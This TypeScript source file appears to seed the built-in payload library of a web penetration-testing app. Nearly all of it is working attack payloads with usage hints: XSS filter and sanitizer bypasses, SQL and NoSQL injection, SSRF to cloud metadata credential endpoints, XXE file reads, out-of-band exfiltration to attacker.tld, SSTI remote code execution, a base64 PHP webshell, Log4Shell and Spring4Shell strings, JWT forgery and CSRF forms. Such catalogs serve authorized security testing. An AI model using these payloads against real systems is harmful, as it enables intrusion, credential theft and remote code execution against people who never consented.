import type { Payload, PayloadCategory } from '$lib/types';

interface PayloadSeed {
  id: string;
  name: string;
  category: PayloadCategory;
  payload: string;
  description?: string;
  tags?: string[];
  source?: string;
}

const seeds: PayloadSeed[] = [
  // ----- XSS -----
  {
    id: 'xss-basic-script',
    name: 'Basic script alert',
    category: 'xss',
    payload: `<script>alert(1)</script>`,
    description: 'Classic reflected XSS smoke test. Use as a baseline before WAF bypasses.',
    tags: ['reflected', 'baseline']
  },
  {
    id: 'xss-img-onerror',
    name: 'Image onerror',
    category: 'xss',
    payload: `<img src=x onerror=alert(1)>`,
    description: 'Bypasses filters that strip <script> tags but leave event handlers.',
    tags: ['reflected', 'event-handler']
  },
  {
    id: 'xss-svg-onload',
    name: 'SVG onload',
    category: 'xss',
    payload: `<svg/onload=alert(1)>`,
    description: 'Compact payload that frequently bypasses regex filters.',
    tags: ['reflected', 'svg', 'short']
  },
  {
    id: 'xss-polyglot',
    name: 'Polyglot (Garcia)',
    category: 'xss',
    payload: `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e`,
    description: 'Single string that fires in 20+ contexts. Useful when context is unknown.',
    tags: ['polyglot', 'multi-context'],
    source: 'OWASP / 0xsobky'
  },
  {
    id: 'xss-dom-hash',
    name: 'DOM XSS via location.hash',
    category: 'xss',
    payload: `#<img src=x onerror=alert(1)>`,
    description: 'For sinks like innerHTML = location.hash.slice(1).',
    tags: ['dom']
  },
  {
    id: 'xss-attr-break',
    name: 'Attribute breakout',
    category: 'xss',
    payload: `" autofocus onfocus=alert(1) x="`,
    description: 'Breaks out of an attribute value when the page reflects user input inside one.',
    tags: ['reflected', 'attribute']
  },
  {
    id: 'xss-template',
    name: 'Template literal sink',
    category: 'xss',
    payload: `\${alert(1)}`,
    description: 'Triggers Angular/JS template injection in unsafe template sinks.',
    tags: ['client-template']
  },
  {
    id: 'xss-mathml',
    name: 'MathML alt-element',
    category: 'xss',
    payload: `<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src onerror=alert(1)>">`,
    description: 'Edge MathML/SVG mutation to escape sanitizers like DOMPurify in older versions.',
    tags: ['mutation', 'sanitizer-bypass']
  },

  // ----- SQLi -----
  {
    id: 'sqli-classic-or',
    name: "Classic ' OR 1=1 --",
    category: 'sqli',
    payload: `' OR 1=1 -- -`,
    description: 'Authentication bypass smoke test. Comment styles vary by DB.',
    tags: ['auth-bypass', 'baseline']
  },
  {
    id: 'sqli-time-based-mysql',
    name: 'MySQL time-based',
    category: 'sqli',
    payload: `1' AND SLEEP(5)-- -`,
    description: 'Confirms blind SQLi on MySQL/MariaDB by observing response delay.',
    tags: ['blind', 'time-based', 'mysql']
  },
  {
    id: 'sqli-time-based-pg',
    name: 'PostgreSQL time-based',
    category: 'sqli',
    payload: `1'; SELECT pg_sleep(5)-- -`,
    description: 'Stacked-query time delay for PostgreSQL backends.',
    tags: ['blind', 'time-based', 'postgres']
  },
  {
    id: 'sqli-time-based-mssql',
    name: 'MSSQL time-based',
    category: 'sqli',
    payload: `1'; WAITFOR DELAY '0:0:5'-- -`,
    description: 'MSSQL stacked WAITFOR to confirm blind SQLi.',
    tags: ['blind', 'time-based', 'mssql']
  },
  {
    id: 'sqli-union-select',
    name: 'UNION SELECT discovery',
    category: 'sqli',
    payload: `' UNION SELECT NULL,NULL,NULL-- -`,
    description: 'Increment NULLs until column count matches; replace one NULL with a string to find a printable column.',
    tags: ['union']
  },
  {
    id: 'sqli-error-extract',
    name: 'Error-based extract (MySQL)',
    category: 'sqli',
    payload: `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -`,
    description: 'Extracts data via duplicate key error in MySQL.',
    tags: ['error-based', 'mysql']
  },
  {
    id: 'sqli-2nd-order',
    name: '2nd-order via comment',
    category: 'sqli',
    payload: `admin'--`,
    description: 'Stored payload that triggers SQLi the next time the value is reused in a query.',
    tags: ['second-order', 'auth-bypass']
  },

  // ----- SSRF -----
  {
    id: 'ssrf-localhost',
    name: 'Localhost variants',
    category: 'ssrf',
    payload: `http://127.0.0.1\nhttp://localhost\nhttp://0.0.0.0\nhttp://[::1]\nhttp://[0:0:0:0:0:ffff:127.0.0.1]`,
    description: 'Try multiple loopback representations against URL filters.',
    tags: ['baseline']
  },
  {
    id: 'ssrf-aws-metadata',
    name: 'AWS IMDSv1 metadata',
    category: 'ssrf',
    payload: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
    description: 'AWS instance metadata endpoint. Modern instances use IMDSv2 with a token header.',
    tags: ['cloud', 'aws']
  },
  {
    id: 'ssrf-gcp-metadata',
    name: 'GCP metadata',
    category: 'ssrf',
    payload: `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`,
    description: 'Requires the Metadata-Flavor: Google header on GCP.',
    tags: ['cloud', 'gcp']
  },
  {
    id: 'ssrf-azure-imds',
    name: 'Azure IMDS',
    category: 'ssrf',
    payload: `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/`,
    description: 'Requires Metadata: true header. Returns a managed identity token.',
    tags: ['cloud', 'azure']
  },
  {
    id: 'ssrf-dns-rebind',
    name: 'DNS rebinding host',
    category: 'ssrf',
    payload: `http://A.A.A.A.B.B.B.B.rbndr.us/`,
    description: 'Resolves alternately to two IPs. Bypass time-of-check filters.',
    tags: ['dns-rebind']
  },
  {
    id: 'ssrf-redirect',
    name: 'Open-redirect chain',
    category: 'ssrf',
    payload: `https://example.com/redirect?url=http://169.254.169.254/`,
    description: 'When the SSRF target validates the host but follows redirects, chain an open redirect.',
    tags: ['redirect']
  },
  {
    id: 'ssrf-gopher',
    name: 'Gopher SMTP',
    category: 'ssrf',
    payload: `gopher://127.0.0.1:25/_HELO%20attacker%0d%0aMAIL%20FROM:%3C%3E%0d%0aRCPT%20TO:%3Cvictim@target%3E%0d%0aDATA%0d%0a...`,
    description: 'Speak raw protocols through gopher:// (SMTP, Redis, Memcached).',
    tags: ['protocol-smuggle', 'gopher']
  },

  // ----- XXE -----
  {
    id: 'xxe-file-read',
    name: 'XXE local file read',
    category: 'xxe',
    payload: `<?xml version="1.0" ?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n<foo>&xxe;</foo>`,
    description: 'Classic out-of-band XXE for /etc/passwd readout.',
    tags: ['file-read']
  },
  {
    id: 'xxe-oob',
    name: 'XXE OOB exfil (param entities)',
    category: 'xxe',
    payload: `<?xml version="1.0" ?>\n<!DOCTYPE r [\n  <!ENTITY % a SYSTEM "http://attacker.tld/x.dtd">\n  %a;\n]>\n<r>&exfil;</r>`,
    description: 'OOB exfiltration via external DTD with parameter entities. Requires attacker-controlled DTD.',
    tags: ['oob', 'param-entity']
  },
  {
    id: 'xxe-billion-laughs',
    name: 'Billion laughs DoS',
    category: 'xxe',
    payload: `<!DOCTYPE lolz [\n  <!ENTITY lol "lol">\n  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">\n  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">\n]>\n<lolz>&lol3;</lolz>`,
    description: 'Memory amplification. Use sparingly and only against authorized targets.',
    tags: ['dos', 'destructive']
  },

  // ----- SSTI -----
  {
    id: 'ssti-baseline',
    name: 'SSTI baseline {{7*7}}',
    category: 'ssti',
    payload: `{{7*7}}`,
    description: 'Returns 49 if any template engine evaluates the expression.',
    tags: ['baseline']
  },
  {
    id: 'ssti-jinja2',
    name: 'Jinja2 RCE',
    category: 'ssti',
    payload: `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}`,
    description: 'Jinja2 sandbox escape via __globals__ to spawn a shell.',
    tags: ['jinja2', 'rce']
  },
  {
    id: 'ssti-twig',
    name: 'Twig RCE',
    category: 'ssti',
    payload: `{{['id']|filter('system')}}`,
    description: 'Twig pipe-to-system using the filter() abuse path.',
    tags: ['twig', 'rce']
  },
  {
    id: 'ssti-freemarker',
    name: 'FreeMarker RCE',
    category: 'ssti',
    payload: `<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("id")}`,
    description: 'Java FreeMarker RCE via Execute utility class.',
    tags: ['freemarker', 'java', 'rce']
  },

  // ----- LFI / Path traversal -----
  {
    id: 'lfi-etc-passwd',
    name: 'Linux /etc/passwd',
    category: 'lfi',
    payload: `../../../../../../etc/passwd`,
    description: 'Traversal staple. Try varying depth and null-byte termination on legacy stacks.',
    tags: ['traversal', 'linux']
  },
  {
    id: 'lfi-windows-win-ini',
    name: 'Windows win.ini',
    category: 'lfi',
    payload: `..\\..\\..\\..\\..\\..\\windows\\win.ini`,
    description: 'Detect LFI on Windows hosts via legacy win.ini.',
    tags: ['traversal', 'windows']
  },
  {
    id: 'lfi-php-filter',
    name: 'PHP wrapper filter',
    category: 'lfi',
    payload: `php://filter/convert.base64-encode/resource=index.php`,
    description: 'Reads PHP source through the base64 filter wrapper.',
    tags: ['php', 'wrapper']
  },
  {
    id: 'lfi-data-wrapper',
    name: 'PHP data wrapper RCE',
    category: 'lfi',
    payload: `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==`,
    description: 'When include() accepts wrappers, get RCE via inline base64 PHP.',
    tags: ['php', 'wrapper', 'rce']
  },

  // ----- RCE / Command Injection -----
  {
    id: 'cmd-bash-substitution',
    name: 'Bash $() substitution',
    category: 'cmd-injection',
    payload: `; id;`,
    description: 'Splits the command and runs id. Try also $(id) and \`id\`.',
    tags: ['linux', 'baseline']
  },
  {
    id: 'cmd-windows-amp',
    name: 'Windows && chain',
    category: 'cmd-injection',
    payload: `& whoami`,
    description: 'Windows command separator alternative to ; on Linux.',
    tags: ['windows']
  },
  {
    id: 'cmd-blind-dns',
    name: 'Blind via DNS exfil',
    category: 'cmd-injection',
    payload: `; nslookup $(whoami).attacker.tld;`,
    description: 'Out-of-band confirmation for blind command injection.',
    tags: ['blind', 'oob']
  },
  {
    id: 'rce-log4shell',
    name: 'Log4Shell JNDI',
    category: 'rce',
    payload: `\${jndi:ldap://attacker.tld/a}`,
    description: 'CVE-2021-44228. Drop in any header/parameter that flows into Log4j.',
    tags: ['cve-2021-44228', 'jndi']
  },
  {
    id: 'rce-spring4shell',
    name: 'Spring4Shell binder',
    category: 'rce',
    payload: `class.module.classLoader.resources.context.parent.pipeline.first.pattern=test`,
    description: 'CVE-2022-22965 magic key chain. Combine with multipart upload to drop a JSP webshell.',
    tags: ['cve-2022-22965', 'spring']
  },

  // ----- Auth bypass -----
  {
    id: 'auth-jwt-none',
    name: 'JWT alg=none',
    category: 'auth-bypass',
    payload: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.`,
    description: 'Replace alg with "none" and strip the signature. Works on libraries that honor "none".',
    tags: ['jwt']
  },
  {
    id: 'auth-jwt-hs256-rs256',
    name: 'JWT RS256→HS256 confusion',
    category: 'auth-bypass',
    payload: `# Generate signature using server's public key as the HMAC secret.\n# python -c "import jwt; print(jwt.encode({'sub':'admin'}, open('pub.pem').read(), algorithm='HS256'))"`,
    description: 'Forces a verifier expecting RS256 to validate using the public key as an HMAC secret.',
    tags: ['jwt', 'algorithm-confusion']
  },
  {
    id: 'auth-x-forwarded',
    name: 'X-Forwarded-For = 127.0.0.1',
    category: 'auth-bypass',
    payload: `X-Forwarded-For: 127.0.0.1\nX-Real-IP: 127.0.0.1\nX-Originating-IP: 127.0.0.1\nX-Remote-IP: 127.0.0.1\nX-Client-IP: 127.0.0.1\nX-Forwarded-Host: localhost`,
    description: 'IP-based admin gates often trust spoofed proxy headers.',
    tags: ['headers', 'admin-panel']
  },
  {
    id: 'auth-host-override',
    name: 'Host header injection',
    category: 'auth-bypass',
    payload: `GET / HTTP/1.1\nHost: admin.target.tld`,
    description: 'Routes to an admin vhost when the front-end forwards Host blindly.',
    tags: ['headers', 'host']
  },

  // ----- IDOR / BAC -----
  {
    id: 'idor-uuid-swap',
    name: 'UUID enumeration',
    category: 'idor',
    payload: `# Capture two account IDs and swap one for the other in:\n# GET /api/v1/users/{id}/transactions`,
    description: 'Authorization should be enforced server-side per object, not by URL.',
    tags: ['authz']
  },
  {
    id: 'idor-method-tamper',
    name: 'Method tampering',
    category: 'idor',
    payload: `# If GET is read-only, try:\n# X-HTTP-Method-Override: PUT\n# Or change the verb directly to PUT/PATCH/DELETE.`,
    description: 'Some APIs miss authorization checks on uncommon verbs.',
    tags: ['method', 'authz']
  },

  // ----- Open redirect -----
  {
    id: 'redirect-protocol',
    name: 'Protocol-relative open redirect',
    category: 'open-redirect',
    payload: `//attacker.tld\n/\\attacker.tld\nhttps:attacker.tld`,
    description: 'Bypasses naive isRelative checks that look for "://".',
    tags: ['baseline']
  },
  {
    id: 'redirect-userinfo',
    name: 'Userinfo trick',
    category: 'open-redirect',
    payload: `https://target.tld@attacker.tld/`,
    description: 'Browsers route by host (attacker.tld) but allowlists may match on the prefix.',
    tags: ['userinfo']
  },

  // ----- CSRF -----
  {
    id: 'csrf-form',
    name: 'Auto-submit CSRF form',
    category: 'csrf',
    payload: `<form id=f action="https://target/api/email" method="POST">\n  <input name=email value="attacker@evil.tld" />\n</form>\n<script>document.getElementById('f').submit()</script>`,
    description: 'Drop on attacker-controlled origin. Confirm cookies are sent with SameSite=None or Lax-bypass.',
    tags: ['classic']
  },
  {
    id: 'csrf-json',
    name: 'JSON CSRF via form',
    category: 'csrf',
    payload: `<form action=https://target/api/x method=POST enctype="text/plain">\n  <input name='{"key":"value","ignored":"' value='"}' />\n</form>`,
    description: 'Submits a JSON-shaped body using text/plain to dodge CORS preflight.',
    tags: ['json']
  },

  // ----- NoSQLi -----
  {
    id: 'nosqli-mongo-auth',
    name: 'Mongo auth bypass',
    category: 'nosqli',
    payload: `{ "username": { "$ne": null }, "password": { "$ne": null } }`,
    description: 'Returns the first user when login query is built without parameterization.',
    tags: ['mongo', 'auth-bypass']
  },
  {
    id: 'nosqli-where',
    name: 'Mongo $where',
    category: 'nosqli',
    payload: `{"$where": "this.password.match(/.*/)"}`,
    description: 'Server-side JS execution path. Time-based variants help with blind extraction.',
    tags: ['mongo']
  },

  // ----- Race / GraphQL / OAuth / Recon -----
  {
    id: 'race-burp-turbo',
    name: 'Single-packet race',
    category: 'race-condition',
    payload: `# Burp Turbo Intruder / Repeater "Send group in parallel" with last-byte-sync\n# Send 30 simultaneous redeem-coupon requests in one TCP packet.`,
    description: 'Modern HTTP/2 allows last-byte sync so requests are processed nearly simultaneously.',
    tags: ['http2', 'logic']
  },
  {
    id: 'graphql-introspection',
    name: 'GraphQL introspection',
    category: 'graphql',
    payload: `{"query":"query IntrospectionQuery {__schema {queryType {name} mutationType {name} types {name fields {name args {name type {name}} type {name}}}}}"}`,
    description: 'Dump the schema even when GraphiQL is disabled if introspection is on.',
    tags: ['recon']
  },
  {
    id: 'graphql-batching',
    name: 'GraphQL query batching',
    category: 'graphql',
    payload: `[{"query":"mutation { login(user:\\"a\\", pass:\\"a\\"){token}}"},{"query":"mutation { login(user:\\"a\\", pass:\\"b\\"){token}}"}]`,
    description: 'Brute force / bypass rate limits by sending many operations in one request.',
    tags: ['rate-limit-bypass']
  },
  {
    id: 'oauth-state-strip',
    name: 'OAuth state strip',
    category: 'oauth',
    payload: `# Remove the state parameter from the redirect_uri callback.\n# https://target/oauth/callback?code=AUTH_CODE`,
    description: 'If the server accepts a missing state, the flow is vulnerable to CSRF account-link.',
    tags: ['csrf']
  },
  {
    id: 'oauth-redirect-uri',
    name: 'redirect_uri allowlist bypass',
    category: 'oauth',
    payload: `https://target.tld.attacker.tld/cb\nhttps://target.tld@attacker.tld/cb\nhttps://target.tld/cb/../../attacker`,
    description: 'Common allowlist parser bugs that let auth codes leak to attackers.',
    tags: ['allowlist']
  },
  {
    id: 'recon-google-dorks',
    name: 'Useful Google dorks',
    category: 'recon',
    payload: `site:target.tld -www\nsite:*.target.tld\nsite:target.tld inurl:admin\nsite:target.tld ext:log OR ext:bak OR ext:env\nsite:github.com "target.tld" password`,
    description: 'Quick dorks for subdomain enum, admin panels, leaked secrets.',
    tags: ['osint']
  },
  {
    id: 'recon-subfinder',
    name: 'Subdomain enumeration chain',
    category: 'recon',
    payload: `subfinder -d target.tld -all -silent | tee subs.txt\nhttpx -l subs.txt -title -tech-detect -status-code -o live.txt\nnuclei -l live.txt -severity high,critical -o findings.txt`,
    description: 'Standard projectdiscovery chain. Pipe live.txt into the Recon tab.',
    tags: ['cli', 'projectdiscovery']
  },
  {
    id: 'crlf-basic',
    name: 'CRLF header injection',
    category: 'crlf',
    payload: `%0d%0aSet-Cookie:%20admin=true`,
    description: 'Inject response headers via reflected URL parameters that flow into Set-Cookie / Location.',
    tags: ['headers']
  },
  {
    id: 'proto-pollute',
    name: 'JSON __proto__ pollution',
    category: 'prototype-pollution',
    payload: `{"__proto__":{"isAdmin":true}}`,
    description: 'Ships across deep-merge libraries. Combine with a gadget like Express options polluting bodyParser.',
    tags: ['javascript', 'gadget-needed']
  },
  {
    id: 'deserial-java-ysoserial',
    name: 'Java ysoserial chain',
    category: 'deserialization',
    payload: `# java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.tld' | base64`,
    description: 'Generate a serialized object for a known gadget chain. Match the chain to the libraries on the classpath.',
    tags: ['java', 'gadget']
  }
];

const now = Date.now();

export const BUILT_IN_PAYLOADS: Payload[] = seeds.map((seed) => ({
  id: `bi-${seed.id}`,
  name: seed.name,
  category: seed.category,
  payload: seed.payload,
  description: seed.description,
  tags: seed.tags ?? [],
  source: seed.source,
  isBuiltIn: true,
  isFavorite: false,
  useCount: 0,
  createdAt: now,
  updatedAt: now
}));

export const PAYLOAD_CATEGORIES: { value: PayloadCategory; label: string }[] = [
  { value: 'xss', label: 'XSS' },
  { value: 'sqli', label: 'SQL Injection' },
  { value: 'nosqli', label: 'NoSQL Injection' },
  { value: 'ssrf', label: 'SSRF' },
  { value: 'xxe', label: 'XXE' },
  { value: 'ssti', label: 'SSTI' },
  { value: 'lfi', label: 'LFI / Path traversal' },
  { value: 'rce', label: 'RCE' },
  { value: 'cmd-injection', label: 'Command Injection' },
  { value: 'auth-bypass', label: 'Auth Bypass' },
  { value: 'idor', label: 'IDOR / BAC' },
  { value: 'open-redirect', label: 'Open Redirect' },
  { value: 'csrf', label: 'CSRF' },
  { value: 'jwt', label: 'JWT' },
  { value: 'race-condition', label: 'Race Conditions' },
  { value: 'crlf', label: 'CRLF' },
  { value: 'deserialization', label: 'Deserialization' },
  { value: 'prototype-pollution', label: 'Prototype Pollution' },
  { value: 'graphql', label: 'GraphQL' },
  { value: 'oauth', label: 'OAuth' },
  { value: 'recon', label: 'Recon' }
];

export function payloadCategoryLabel(category: PayloadCategory): string {
  return PAYLOAD_CATEGORIES.find((entry) => entry.value === category)?.label ?? category;
}
